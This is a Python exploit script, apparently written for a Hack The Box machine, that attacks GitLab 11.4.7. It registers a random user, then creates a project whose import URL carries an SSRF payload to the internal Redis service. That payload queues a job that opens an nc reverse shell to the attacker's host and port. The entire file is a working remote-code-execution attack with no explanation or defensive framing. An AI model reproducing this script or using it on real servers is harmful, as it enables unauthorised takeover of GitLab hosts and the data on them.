#!/usr/bin/env python3 

import requests 
import re 
import sys 
import string 
import random 
import argparse 
from time import sleep 
from base64 import b64decode as dc 
# Parser to analyse input 
parser = argparse.ArgumentParser(description='--- GitLab 11.4.7 RCE ---') 
parser.add_argument('--url', help='GitLab URL') 
parser.add_argument('--lport', help='Local port for rev shell') 
parser.add_argument('--lhost', help='Local host for rev shell') 
args = parser.parse_args() 
session = requests.Session() 
local_host = args.lhost 
local_port = args.lport 
url = args.url  
proxies = {"http":"http://127.0.0.1:8080"} 
# Creating function to grab token 
def grab_token(target): 
    res = session.get(target) 
    token = re.search('name="csrf-token" content="(.*)"', res.text).group(1) 
    return token 
# Automatically create user 
def create_user(target): 
    basic_token = grab_token(target) 
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(5)) 
    print(f"[*] Creating random username: {username}") 
    sleep(0.5) 
    email = username + "@" + username + ".htb" 
    password = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(8)) 
    print(f"[*] Creating random password: {password}") 
    sleep(0.5) 
    data = { 
        "utf-8": f"{dc('4pyT').decode()}", 
        "authenticity_token" : basic_token, 
        "new_user[name]" : username, 
        "new_user[username]" : username, 
        "new_user[email]" : email, 
        "new_user[email_confirmation]" : email, 
        "new_user[password]" : password 
            } 
    cookies = {'sidebar_collapsed':'false'} 
    req = session.post(target, data=data, allow_redirects = False) 
    # Check if successfully create user and grab a new auth_cookie 
    if "users" in req.headers['Location']: 
        print(f"[*] Successfully create user {username}:{password}!") 
        sleep(0.5) 
    else: 
        print("[-] Oops! Something Wrong !") 
# Write a new project 
def create_project(target): 
    req = session.get(target + '/new') 
    auth_token = grab_token(target) 
    proj_name = "rce-gitlab" + str(random.randint(1, 50)) 
    print(f"[*] Creating random project: {proj_name}") 
    sleep(0.5) 
    print("[*] Exploiting ...") 
    sleep(1) 
    namespace_id = re.search('<input value="(.*)" type="hidden" name="project\[namespace_id\]"', req.text).group(1) 
    payload = f"""git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open%28%5C%27%7C%20rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20{local_host}%20{local_port}%3E%2Ftmp%2Ff%5C%27%29.read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0D%0A%20exec%0D%0A%20exec""" 
    data = { 
        "utf-8": f"{dc('4pyT').decode()}", 
        "authenticity_token" : auth_token, 
        "project[import_url]" : payload, 
        "project[ci_cd_only]" : "false", 
        "project[name]" : proj_name,  
        "project[namespace_id]" : namespace_id, 
        "project[path]" : proj_name, 
        "project[description]" : "", 
        "project[visibility_level]" : "0" 
            } 
    headers = {'Referrer' : target + '/new'} 
    res = session.post(target, data=data, headers=headers) 
    print("[*] Should get a shell now!") 
def main(): 
    usage = '[*] Usage: python3 ready.py --url http://exmaple.com:5080 --lhost 10.10.10.10 --lport 1337' 
    try: 
        if len(sys.argv) < 7: 
            print('[-] Missing something') 
            print(usage) 
        else: 
            reg_url = url + "/users" 
            proj_url = url + "/projects" 
            create_user(target=reg_url) 
            create_project(proj_url) 
    except: 
        print('[-] Failed') 
        print("[-] Please check if the host is up") 
        print(usage) 
        sys.exit(1) 
if __name__ == '__main__': 
    main()
